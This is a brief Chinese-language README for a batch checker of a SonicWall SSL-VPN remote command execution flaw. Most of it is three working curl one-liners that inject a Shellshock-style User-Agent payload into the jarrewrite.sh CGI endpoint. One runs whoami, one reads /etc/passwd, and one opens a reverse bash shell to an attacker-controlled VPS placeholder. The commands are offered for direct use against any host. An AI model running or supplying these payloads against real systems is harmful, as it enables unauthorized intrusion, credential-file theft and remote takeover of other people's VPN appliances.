# SonicWallSSL-VPN_RCE
一个简单的SonicWallSSL-VPN远程命令执行批量验证脚本
脚本写得比较简单，主要是对于批量url检测比较实用，单个url检测直接在命令行检测即可，

比如：

curl -A "() { :; }; echo ; /bin/bash -c 'whoami'" https://x.x.x.x/cgi-bin/jarrewrite.sh -k
curl -A "() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'" https://x.x.x.x/cgi-bin/jarrewrite.sh -k
curl -A "() { :; }; echo ; /bin/bash -c ' bash -i >& /dev/tcp/VPS的IP/1234  0>&1 '" https://x.x.x.x/cgi-bin/jarrewrite.sh -k
